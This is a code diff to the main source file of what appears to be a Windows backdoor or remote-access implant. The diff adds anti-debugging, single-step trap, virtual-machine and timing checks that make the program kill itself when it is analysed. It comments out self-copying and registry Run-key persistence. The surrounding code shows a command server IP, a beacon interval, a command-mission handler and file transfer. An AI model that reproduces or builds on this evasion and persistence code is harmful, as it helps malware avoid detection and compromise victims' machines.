@@ -26,7 +26,10 @@
 
 #include "config.h"
 #include "vm.h"
+#include "AntiAnti.h"
+#include "AntiDetect.h"
 #include <shlobj_core.h>
+#include "AntiAnti.h"
 
 #pragma comment(lib,"ws2_32.lib")
 
@@ -39,85 +42,65 @@ using namespace std;
 // #pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")
 
 
-HANDLE g_mutex_handle = 0;
 
+
+extern "C" int asmSingleTrap();
 
 static const char g_predata[MAX_PATH] = "0123456789abcdef";
 
 
 
-int __stdcall delFileProc(wchar_t * filename) {
-	do 
-	{
-		Sleep(1000);
-		int ret = DeleteFileW(filename);
-		if (ret)
-		{
-			//runLog("delete file:%ws\r\n", filename);
-			break;
-		}
-		
-	} while (TRUE);
 
-	return 0;
+void test() {
+	
 }
-
-
-
-int restart(const char * newpath,const char * oldpath) {
-	int ret = 0;
-
-	if (lstrcmpiA(newpath, oldpath) != 0) {
-
-		ret = copySelf((char*)newpath,oldpath);
-		if (ret)
-		{
-			return 0;
-
-			ReleaseMutex(g_mutex_handle);
-			CloseHandle(g_mutex_handle);
-			char szcmd[1024];
-			wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newpath, oldpath);
-			ret = WinExec(szcmd, SW_SHOW);
-			ExitProcess(0);
-		}
-	}
-	return 0;
-}
-
 
 int init() {
 
 	int ret = 0;
 
 	//__debugbreak();
-
-	LPWSTR argvs = GetCommandLineW();
-
-	int argc = 0;
-	LPWSTR * wstrcmds = CommandLineToArgvW(argvs, &argc);
-	if (argc > 2 && lstrcmpiW(wstrcmds[1], L"/Delete") == 0) 
-	{
-// 		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
-// 		if (ht)
-// 		{
-// 			CloseHandle(ht);
-// 		}
-	}
 	
+	test();
+
+	opLog("starting\r\n");
+
+
 	g_mutex_handle = bRunning(&ret);
 	if (ret)
 	{
-		//runLog("already running\r\n");
-		ExitProcess(0);
+		opLog("already running\r\n");
+		suicide();
 	}
 
-	ret = isDebugged();
+	ret = Debug::isDebugged();
 	if (ret)
 	{
-		//runLog("debuggered\r\n");
-		//ExitProcess(0);
+		opLog("debuggered\r\n");
+		suicide();
 	}
+
+	Debug::attach();
+
+	ret = asmSingleTrap();
+
+	ret = exceptTest();
+
+	LPWSTR argvs = GetCommandLineW();
+	int argc = 0;
+	LPWSTR * wstrcmds = CommandLineToArgvW(argvs, &argc);
+	if (argc > 2 && lstrcmpW(wstrcmds[1], L"/Delete") == 0) 
+	{
+		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
+		if (ht)
+		{
+			CloseHandle(ht);
+		}
+	}
+	
+	VM::checkVM();
+
+	VM::checkTickCount();
 
 	WSAData wsa;
 	ret = WSAStartup(0x0202, &wsa);
@@ -135,9 +118,10 @@ int init() {
 
 		opLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
 	
+		/*
 		if ( isalpha (params->path[0]) &&params->path[1] == ':' && params->path[2] == '\\')
 		{
-			ret = restart(params->path, curpath);	
+			//ret = restart(params->path, curpath);	
 			//KillSelfAndRun(params->path, "exit");
 			ret = setRegBootRun(HKEY_CURRENT_USER, (char*)params->path);
 		}
@@ -165,22 +149,21 @@ int init() {
 
 			ret = CreateDirectoryA(folder.c_str(), 0);
 
-			ret = restart(newfn.c_str(), curpath);
+			//ret = restart(newfn.c_str(), curpath);
 
 			//KillSelfAndRun(newfn.c_str(), "exit");
 
 			ret = setRegBootRun(HKEY_CURRENT_USER, (char*)newfn.c_str());
 		}
+		*/
 	}
 	else {
 		//MessageBoxA(0, 0, 0, 0);
 		ret = Config::getConfig();
 
-		ret = setRegBootRun(HKEY_CURRENT_USER, curpath);
+		//ret = setRegBootRun(HKEY_CURRENT_USER, curpath);
 	}
-
 	
-
 	ret = getUUID();
 
 	return ret;
@@ -425,7 +408,7 @@ int __stdcall cmdMission() {
 //file tree,upload port and download port,network optimize
 //all english output,remove anotation
 //disk or file failed
-//
+
 
 
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
@@ -570,7 +553,6 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					int dfnlen = *(int*)pack2;
 					string dfn = string(pack2 + sizeof(int), dfnlen);
 
-					char* data = 0;
 					int filesize = 0;
 					ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
 					if (ret)
